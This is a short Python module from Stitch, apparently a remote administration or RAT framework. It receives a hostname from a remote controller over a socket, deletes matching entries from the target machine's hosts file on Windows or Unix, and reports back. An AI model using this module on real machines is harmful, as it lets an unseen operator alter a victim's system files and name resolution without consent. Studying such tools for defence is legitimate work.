# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

system = sys.platform
if win_client():
    hosts_file = 'C:\\Windows\\System32\\drivers\\etc\\hosts'
else:
    hosts_file = '/etc/hosts'

def host_exists(hostname,hosts):
    with open(hosts, 'rb') as h:
        for line in h:
            if hostname in line:
                return True
    return False

def remove_host(hostname,hosts):
    old_line = ''
    new_hosts = ''
    try:
        with open(hosts, 'r') as h:
            data = h.readlines()
        for index, n in enumerate(data):
            if hostname in n:
                data[index] = '\n'
                try:
                    if data[index-1] == '\n':
                        data[index-1] =""
                    if data[index+1] == '\n':
                        data[index+1] =""
                except IndexError: pass
        for n in data:
            new_hosts += n
        new_hosts = "{}\n".format(new_hosts.strip('\n'))
        with open(hosts, 'wb') as h:
            h.writelines(new_hosts)
        return True,None
    except Exception as e:
        return False,str(e)

hostname = receive(client_socket)

if host_exists(hostname,hosts_file):
    success, err = remove_host(hostname,hosts_file)
    if success and not err:
        resp = f'[+] Successfully removed "{hostname}" from {hosts_file}\n'
    else:
        resp = f'[!] ERROR: {err}\n'
else:
    resp = f'[*] Hostname "{hostname}" was not found in the hosts file.\n'
send(client_socket,resp)
